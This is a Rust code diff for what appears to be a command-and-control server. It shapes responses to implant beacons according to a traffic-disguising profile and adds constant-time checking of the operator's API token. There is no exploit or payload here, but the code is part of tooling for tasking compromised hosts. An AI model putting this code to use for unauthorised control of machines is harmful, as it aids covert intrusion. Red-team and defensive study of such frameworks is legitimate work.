@@ -313,8 +313,13 @@ fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
             resp.headers_mut().insert(n, v);
         }
     }
-    // If the output terminator is a named header/parameter, inject the
-    // transformed frame bytes there (overriding any static value for that name).
+    // If the output terminator is a named header, inject the transformed frame
+    // bytes there (overriding any static value for that name). For a Parameter
+    // terminator the bytes can't ride in a query string on a *response* (the
+    // server doesn't control the beacon's request URL), so they go in the body
+    // — the agent inverts them from the body. uri-append is request-side only
+    // (the beacon appends to its own URL), so on the response path it falls back
+    // to the body as well.
     match &env.terminator {
         Some(nyx_profile::Terminator::Header(h)) => {
             if let (Ok(n), Ok(v)) = (
@@ -322,12 +327,34 @@ fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
                 HeaderValue::from_bytes(&extra),
             ) {
                 resp.headers_mut().insert(n, v);
+            } else {
+                // The transform output isn't valid header bytes (non-ASCII after
+                // a non-base64 chain like mask). Log so the operator sees the
+                // profile/transform incompatibility instead of silent frame loss.
+                tracing::warn!(
+                    header = %h,
+                    "profile output terminator 'header' produced non-ASCII bytes \
+                     (need base64/hex in the transform chain); response body empty"
+                );
             }
         }
-        // parameter/uri-append/print: the bytes are in the body already; the
-        // server can't reach into the request URL from a response, so
-        // uri-append is implant-side. parameter rides in the body for the
-        // server response (the beacon knows its own profile).
+        Some(nyx_profile::Terminator::Parameter(_))
+        | Some(nyx_profile::Terminator::UriAppend) => {
+            // The transformed bytes belong in the body for the response path.
+            if !extra.is_empty() {
+                resp = (StatusCode::OK, body_bytes(extra)).into_response();
+                // Re-apply static headers (the body swap dropped them).
+                use axum::http::HeaderValue;
+                for (name, val) in &env.headers {
+                    if let (Ok(n), Ok(v)) = (
+                        axum::http::HeaderName::from_bytes(name),
+                        HeaderValue::from_bytes(val),
+                    ) {
+                        resp.headers_mut().insert(n, v);
+                    }
+                }
+            }
+        }
         _ => {}
     }
     resp
@@ -336,6 +363,18 @@ fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
 /// Wrap a Vec<u8> as an axum response body.
 fn body_bytes(b: Vec<u8>) -> axum::body::Body {
     axum::body::Body::from(b)
+}
+
+/// Constant-time byte comparison to avoid timing oracles on secrets.
+fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
+    if a.len() != b.len() {
+        return false;
+    }
+    let mut diff = 0u8;
+    for (x, y) in a.iter().zip(b.iter()) {
+        diff |= x ^ y;
+    }
+    diff == 0
 }
 
 fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> anyhow::Result<Vec<u8>> {
@@ -463,15 +502,24 @@ struct SessionView {
 /// If an API token is configured, every control-API request must carry
 /// `Authorization: Bearer <token>`. `/beacon` is exempt (implants authenticate
 /// cryptographically). Returns `Ok(())` when allowed, else a 401 `Response`.
+///
+/// Comparison is constant-time to avoid a timing oracle on the operator token
+/// (the API token gates tasking on every active beacon — a side-channel leak is
+/// a serious operational risk).
 fn require_auth(st: &AppState, headers: &HeaderMap) -> Option<Response> {
     let Some(expected) = &st.api_token else {
         return None;
     };
     let want = format!("Bearer {expected}");
-    let ok = headers
+    let got = headers
         .get(axum::http::header::AUTHORIZATION)
-        .and_then(|h| h.to_str().ok())
-        .is_some_and(|h| h == want);
+        .and_then(|h| h.to_str().ok());
+    // Constant-time comparison: compare lengths then XOR-accumulate all bytes.
+    // A timing attacker learns nothing about how many leading bytes matched.
+    let ok = match got {
+        Some(g) => constant_time_eq(want.as_bytes(), g.as_bytes()),
+        None => false,
+    };
     if ok {
         None
     } else {
